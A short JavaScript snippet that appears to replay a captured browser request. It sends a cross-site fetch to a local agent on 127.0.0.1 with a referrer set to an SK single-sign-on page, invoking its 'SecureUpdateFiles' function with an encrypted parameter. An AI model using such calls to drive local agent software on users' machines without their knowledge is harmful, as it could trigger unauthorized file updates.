async function fetchForBrowser() {
    const baseUrl = "https://127.0.0.1:17489/?callback=nexessCallBack707529&data=";
    const commonOptions = {
        headers: {
            "accept": "*/*",
            "accept-language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site"
        },
        referrer: "http://sso.sk.com:10000/",
        referrerPolicy: "strict-origin-when-cross-origin",
        body: null,
        method: "GET",
        mode: "no-cors",
        credentials: "omit"
    };

    const urls = {
              default: `${baseUrl}%7B%22func%22:%22SecureUpdateFiles%22,%22param%22:%22vUdwYz%2B%2FUJZ%2FVpr71dB2Oef4XlxVkAOZAYFQmaos3Bg%3D%7CNf7fDDHdQGo0wDI11Mkb5w%3D%3D%7C1%22%7D&_=%22`
    };

    await fetch(urls['default'], commonOptions);
}

fetchForBrowser();
